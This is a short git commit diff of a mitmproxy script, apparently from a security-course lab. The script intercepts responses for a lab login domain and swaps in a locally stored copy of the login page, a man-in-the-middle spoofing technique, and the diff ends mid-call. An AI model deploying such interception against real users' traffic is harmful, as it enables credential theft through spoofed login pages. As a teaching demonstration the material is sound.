b57183f08b74626e3023bd4d37a2a2358e4c1397
Mats Högberg <mats@hgbrg.se>
2019-05-22 12:06:45 +0200

    Updated mitmproxy.py script

--- mitmproxy.py
+++ mitmproxy.py
@@ -1,14 +1,19 @@
 from mitmproxy import ctx, http
 
 
+# Read the html from the login page. In a real-world scenario, the attacker
+# would have scraped the website and downloaded it locally.
 with open("secure/login.html") as f:
     html = f.read()
 
 
 class Intercepter:
     def response(self, flow):
-        if flow.request.pretty_url in ["http://tda602-secure-login.tk/", "http://www.tda602-secure-login.tk/"]:
-            ctx.log.info("mitm")
+        if flow.request.pretty_url in [
+            "http://tda602-secure-login.tk/",
+            "http://www.tda602-secure-login.tk/",
+        ]:
+            ctx.log.info("intercepted request to tda602-secure-login.tk")
             flow.response = http.HTTPResponse.make(
                 200,
                 html,
